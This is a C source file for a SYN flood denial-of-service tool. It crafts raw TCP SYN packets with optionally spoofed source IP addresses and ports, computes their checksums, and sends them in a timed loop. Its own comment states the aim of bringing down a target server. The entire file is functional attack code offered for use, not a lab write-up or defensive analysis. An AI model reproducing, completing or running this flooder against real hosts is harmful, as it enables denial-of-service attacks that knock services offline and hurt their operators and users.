#include "synflood.h"

bool attack = true;
struct in_addr current_ipv4_addr;

extern bool enable_sniffer;  /* Defined in cli.c */
extern bool enable_spoofing;  /* Defined in cli.c */

void
sigalrm_handler (int signo)
{
  attack = false;
}


void
sigterm_handler (int signo)
{
  exit(EXIT_SUCCESS);
}


/**
 * First create a raw socket and tell the kernel that we'll be including
 * the IP and TCP headers ourselves and that no non-link layer headers
 * should be prepended by the kernel.
*/
int
getRawSocket ()
{
  int on = 1;
  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (sockfd == -1) {
    if (errno == EPERM)
      die("%d: must be root to open raw sockets.\n", __LINE__ - 3);
    die("%d: %s\n", __LINE__ - 4, errno, strerror(errno));
  }
  if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1)
    die("%s: %d\n", __LINE__ - 1, strerror(errno));
  return sockfd;
}


void
setIpHeaders (struct iphdr *ip_headers, struct in_addr *hin_addr)
{
  ip_headers->ihl = 0x5;
  ip_headers->version = 0x4;
  ip_headers->tos = 0x00;
  ip_headers->tot_len = 0x00;     /* Will be set by the kernel. See raw(7). */
  ip_headers->id = 0x00;          /* Will be set by the kernel. See raw(7). */
  ip_headers->frag_off = 0x0040;  /* Don't fragment. */
  ip_headers->ttl = 0x40;         /* 0d64 */
  ip_headers->protocol = 0x06;
  ip_headers->check = 0x0000;     /* Will be set by the kernel. See raw(7). */
  /* Can't wait for the kernel because need to compute the checksum ourselves. */
  ip_headers->saddr = enable_spoofing ? getSpoofedIpAddr() : current_ipv4_addr.s_addr;
  ip_headers->daddr = hin_addr->s_addr;
}


void
setTcpHeaders (struct tcphdr *tcp_headers, in_port_t port)
{
  tcp_headers->th_sport = htons(getSpoofedPortNumber());
  tcp_headers->th_dport = port;
  tcp_headers->th_seq = htonl(random());
  tcp_headers->th_ack = 0x0000;
  tcp_headers->th_x2 = 0x0;
  tcp_headers->th_off = 0x5;
  tcp_headers->th_flags = TH_SYN;
  tcp_headers->th_win = htons(64240);
  tcp_headers->th_sum = 0x00;   /* We will need to construct a pseudo header and compute this later. */
  tcp_headers->th_urp = 0x00;
}


/**
 * TCP uses a special checksum algorithm whereby the checksum is not only calculated
 * over the bytes of the TCP data but it also includes some network layer (IP) data.
 * A 12-bytes "pseudo-checksum" is created and temporarily prepended to the TCP segment
 * for the sake of checksum calculation.
 * See pages 774-777 of "The TCP-IP Guide by Charles M. Kozierok (2005)" for more
 * information. Also see https://tools.ietf.org/html/rfc1071 for the algorithm.
 * Note: in our given scenario, there will never be an "odd byte".
*/
uint16_t
pseudoHeaderTcpChecksum (struct iphdr *ip_headers, struct tcphdr *tcp_headers)
{
  uint16_t chksum_buffer[sizeof(tcp_pseudo_header_t)];

  /* First populate the pseudo header. */
  tcp_pseudo_header_t *pheader = (tcp_pseudo_header_t *) chksum_buffer;
  pheader->saddr = ip_headers->saddr;
  pheader->daddr = ip_headers->daddr;
  pheader->proto = ip_headers->protocol;
  pheader->rsvd = 0x0;
  pheader->seglen = htons(20);
  memcpy(&pheader->thdr, tcp_headers, sizeof(struct tcphdr));

  /* Now compute the checksum following the steps listed in the RFC. */
  long chksum = 0;
  uint16_t *ptr = chksum_buffer;
  size_t count = sizeof(tcp_pseudo_header_t);
  while (count > 1) {
    chksum += *ptr;
    ++ptr;
    count -= 2;
  }
  if (count == 1)
    chksum += *(uint8_t *)ptr;

  chksum = (chksum >> 16) + (chksum & 0xffff);
  chksum = chksum + (chksum >> 16);
  chksum = ~chksum;
  return (uint16_t) chksum;
}


/**
 * Bring down the target (host) server with a flood of TCP SYN packets
 * with spoofed IP addresses.
*/
void
synflood (char *hostname, unsigned int port, struct sockaddr_in host_addr)
{
  int sockfd = getRawSocket();

  uint8_t packet[PACKET_BUFFER_LEN];
  struct iphdr *ip_headers = (struct iphdr *) packet;
  struct tcphdr *tcp_headers = (struct tcphdr *) (ip_headers + 1);

  while (attack) {
    /* Because we want to spoof the IP address and port number of each packet, we will need to
     * reconstruct the packet each time we want to send one. */
    setIpHeaders(ip_headers, &host_addr.sin_addr);
    setTcpHeaders(tcp_headers, host_addr.sin_port);
    tcp_headers->th_sum = pseudoHeaderTcpChecksum(ip_headers, tcp_headers);
    if (sendto(sockfd, packet, PACKET_BUFFER_LEN, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1)
      die("%d: Failed to send packet: %s\n", __LINE__ - 1, strerror(errno));
    memset(packet, 0x0, sizeof(uint8_t) * PACKET_BUFFER_LEN);
  }
}


int
main (int argc, char *argv[], char *envp[])
{
  vlog("synflood process started [pid: %d].\n", getpid());

  /* Register the signal handlers. */
  signal(SIGALRM, sigalrm_handler);
  signal(SIGTERM, sigterm_handler);

  seedRandomNumberGenerator();

  /* Set the process group so that we may later kill all processes
   * that this process will fork (this process included) on encountering
   * a critical error. */
  if (setpgid(0, 0) == -1)
    die("%d: %s", __LINE__ - 1, strerror(errno));

  /* Parse the command line arguments. */
  pid_t pid;
  unsigned short int port;
  unsigned int attack_time;
  struct sockaddr_in host_addr;
  char hostname[HOSTNAME_BUFFER_LENGTH];
  getOptions(argc, argv, hostname, &port, &host_addr, &attack_time);
  current_ipv4_addr = getCurrentIpAddr();
  char current_ipv4_addr_buf[32];
  strcpy(current_ipv4_addr_buf, inet_ntoa(current_ipv4_addr));
  vlog("Initialized synflood with:\n\
  target hostname:        %s\n\
  target address:         %s\n\
  target port:            %d\n\
  attack time:            %u %s\n\
  sniffer:                %s\n\
  spoofing:               %s\n\
  own address:            %s\n",
       hostname, inet_ntoa(host_addr.sin_addr), port, attack_time,
       attack_time == 1 ? "second" : "seconds", enable_sniffer ? "disabled" : "enabled",
       enable_spoofing ? "enabled" : "disabled", current_ipv4_addr_buf);

  if (enable_sniffer) {
    pid = fork();
    if (pid == 0)
      sniff(hostname, port);
  }

  vlog("Commencing attack in %d %s.\n", SUSPENSE_TIME, SUSPENSE_TIME == 1 ? "second" : "seconds");
  sleep(SUSPENSE_TIME);

  alarm(attack_time);
  synflood(hostname, port, host_addr);
  sleep(SUSPENSE_TIME);
  
  /* It seems like pcap spawns some kind of weird daemon or regular child process that we can't
   * wait on and kill normally. So take down the entire process group! */
  if (killpg(0, SIGTERM) == -1)
    fprintf(stderr, "%d: %s.\n", __LINE__ - 1, strerror(errno));
  
  return EXIT_SUCCESS;
}

